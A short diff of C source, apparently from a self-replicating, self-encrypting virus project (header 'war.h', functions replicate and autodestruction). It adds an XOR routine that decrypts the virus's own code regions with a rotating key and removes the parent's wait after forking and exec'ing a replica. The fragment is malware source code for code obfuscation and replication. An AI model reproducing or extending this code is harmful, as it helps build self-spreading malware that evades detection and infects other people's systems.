@@ -1,6 +1,16 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
+/// STATIC FUNCTION
+////////////////////////////////////////////////////////////////////////////////
+
+__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
+{
+	for (register size_t index = 0; index < size; index++)
+		callee[index] ^= keychain->key[RIGHT];
+}
+
+////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
@@ -33,8 +43,6 @@ void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		_execve(av[0], av, NULL);
 		_fatal(1);
 	}
-	else
-		_wait4(child, NULL, WSTOPPED, NULL);
 
 label:
 	update_keychain_right(keychain, (char *)replicate, (void *)autodestruction - (void *)replicate);
